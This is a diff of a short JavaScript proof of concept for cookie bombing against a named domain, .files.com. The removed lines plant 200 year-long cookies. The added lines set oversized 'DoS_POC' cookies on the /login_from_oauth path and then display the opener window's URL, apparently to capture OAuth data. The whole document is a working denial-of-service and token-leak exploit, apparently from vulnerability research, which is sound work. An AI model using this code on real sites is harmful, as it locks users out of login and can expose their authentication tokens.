@@ -1,18 +1,4 @@
-const COOKIE_COUNT = 200;
-const COOKIE_SIZE  = 100; 
-
-const PATH   = "/";                 
-const DOMAIN = ".files.com";                  
-const MAX_AGE = 60 * 60 * 24 * 365;  
-
-for (let i = 0; i < COOKIE_COUNT; i++) {
-  let cookie = `cookie_${i}=${'x'.repeat(COOKIE_SIZE)}`;
-
-  if (PATH)   cookie += `; path=${PATH}`;
-  if (DOMAIN) cookie += `; domain=${DOMAIN}`;
-  if (MAX_AGE) cookie += `; max-age=${MAX_AGE}`;
-
-  document.cookie = cookie;
-}
-
-alert('Total cookies Added:', document.cookie.split(';').length);
+for (i = 1; i < 4; i++)
+  document.cookie = `DoS_POC${i > 1 ? i : ""}=${"w".repeat(4000)};Path=/login_from_oauth;Domain=.files.com`;
+// wait 10 seconds
+alert(window.opener.location.href);
